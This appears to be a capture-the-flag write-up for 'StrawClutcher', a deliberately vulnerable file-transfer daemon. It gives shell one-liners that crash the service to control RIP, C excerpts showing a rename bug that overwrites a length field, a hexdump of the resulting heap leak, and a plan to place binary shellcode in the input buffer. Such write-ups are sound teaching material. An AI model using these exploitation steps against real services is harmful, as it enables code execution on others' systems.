StrawClutcher 

StrawClutcher is a reference to [this paper](http://phrack.org/issues/63/14.html)

To get code execution, you need to shift rsp to overwrite something useful.

```python
for x in range(0xfffffffffffff000, 0x10000000000000000, 16):
  print x
```

and 

```sh
for i in `cat input` ; do (printf "PUT def.ext $i\n"; perl -e 'print "\xcc" x 8192') | timeout -k 1 1 ./StrawClutcher  ; done
```

should (I guess, subject to compiler, possibly stack level aslr layout) give
you a crash in main, retting to 0xcccccccccccccccc

But controlling RIP isn't too useful at this stage - pie, aslr, ssp, etc, so...
info leak time!

```c
struct filedata {
        char filename[FILENAMESIZE];
        long length;
        unsigned char *data;
        int mmap;

        SLIST_ENTRY(filedata) entries;
};
```

```c
                fn1 = strndup(id, (int)(client - id - 1));
                if(strlen(fn1) >= 32) {
                        printf("300 Filename too long.\n");
                        return true;
                }

                fn2 = strndup(client, (int)(YYMARKER - client));
                if(strlen(fn1) >= 32) {
                        // Buggy here. Should be fn2
                        printf("300 Destination filename too long.\n");
                        return true;
                }

                // Check if filename exists in records

                ret = rename_file(fn1, fn2);

...


/*
 * This section causes the fdp->length section to be overwritable, thus
 * modifying the "length" field, which then causes an info leak to be
 * possible.
 */

static bool rename_file(char *source, char *destination)
{
        struct filedata *fdp;

        SLIST_FOREACH(fdp, &head, entries) {
                if(strcmp(fdp->filename, source) == 0) {
                        // Below is needed to avoid memcpy_chk and SSP.
                        __builtin_memcpy(fdp->filename, destination, strlen(destination));

                        printf("200 Filename renamed\n");
                        return true;
                }
        }

        printf("400 File not found\n");
        return true;
}
```

You can cause a stack info leak by overwriting the length value - doesn't
necessarily need to be precisely controlled, we just need a heap pointer
that we can use to calculate where our shellcode is.

```sh
$ (printf "PUT abc.ext 12\n"; perl -e 'print "x" x 12'; printf "LIST\nRENAME abc.ext DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.ext\nLIST\nRETR DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.ext\n";) | ./StrawClutcher  | xxd
00000000: 3230 3020 5761 7465 7244 7261 676f 6e20  200 WaterDragon 
00000010: 4669 6c65 2054 7261 6e73 6665 7220 4461  File Transfer Da
00000020: 656d 6f6e 0a73 7a20 6973 2031 320a 3230  emon.sz is 12.20
00000030: 3020 456e 7472 7920 6372 6561 7465 640a  0 Entry created.
00000040: 3233 312e 2046 696c 6573 2061 7320 666f  231. Files as fo
00000050: 6c6c 6f77 730a 3233 322e 2022 6162 632e  llows.232. "abc.
00000060: 6578 7422 202d 2031 3220 6279 7465 730a  ext" - 12 bytes.
00000070: 3233 3120 446f 6e65 210a 3230 3020 4669  231 Done!.200 Fi
00000080: 6c65 6e61 6d65 2072 656e 616d 6564 0a32  lename renamed.2
00000090: 3331 2e20 4669 6c65 7320 6173 2066 6f6c  31. Files as fol
000000a0: 6c6f 7773 0a32 3332 2e20 2244 4444 4444  lows.232. "DDDDD
000000b0: 4444 4444 4444 4444 4444 4444 4444 4444  DDDDDDDDDDDDDDDD
000000c0: 4444 4444 4444 4444 4444 4444 4444 4444  DDDDDDDDDDDDDDDD
000000d0: 2e65 7874 2220 2d20 3131 3620 6279 7465  .ext" - 116 byte
000000e0: 730a 3233 3120 446f 6e65 210a 3230 3020  s.231 Done!.200 
000000f0: 4669 6c65 2064 6f77 6e6c 6f61 6420 7374  File download st
00000100: 6172 7465 642e 2050 7265 7061 7265 2074  arted. Prepare t
00000110: 6f20 6765 7420 3131 3620 6279 7465 730a  o get 116 bytes.
00000120: 7878 7878 7878 7878 7878 7878 0000 0000  xxxxxxxxxxxx....
00000130: 0000 0000 0000 0000 4100 0000 0000 0000  ........A.......
00000140: 4444 4444 4444 4444 4444 4444 4444 4444  DDDDDDDDDDDDDDDD
00000150: 4444 4444 4444 4444 4444 4444 4444 4444  DDDDDDDDDDDDDDDD
00000160: 4444 4444 442e 6578 7400 0000 0000 0000  DDDDD.ext.......
00000170: 0000 0000 0000 0000 c1fa 0100 0000 0000  ................
00000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000190: 0000 0000 3230 3020 4461 7461 2074 7261  ....200 Data tra
000001a0: 6e73 6665 7272 6564 210a 3230 3020 5468  nsferred!.200 Th
000001b0: 616e 6b20 796f 752c 2068 6176 6520 6120  ank you, have a 
000001c0: 6e69 6365 2064 6179 210a                 nice day!.

```

In this above example, we can leak 116 - 12 bytes of data from the heap.

Now that we know where the heap is, where do we store the shellcode?

Intended location is to use the input buffer, as we can store the most
things there without restrictions..

```c
static bool process_input()
{
        static char *linebuf, *p;
        const char *YYMARKER, *YYCURSOR, *id, *client;

        if(linebuf == NULL) {
                linebuf = malloc(512);
                linebuf[511] = 0;
        }

        if(fgets(linebuf, 511, stdin) == NULL) return false;
        p = strchr(linebuf, '\n');
        if(p) *p = 0;
        p = strchr(linebuf, '\r');
        if(p) *p = 0;

```

Which makes our input

WHATEVER COMMAND\r<binary shellcode>\n

hopefully it's relatively obvious to people. otherwise they might
think they need a-zA-Z0-9 shellcode, etc.


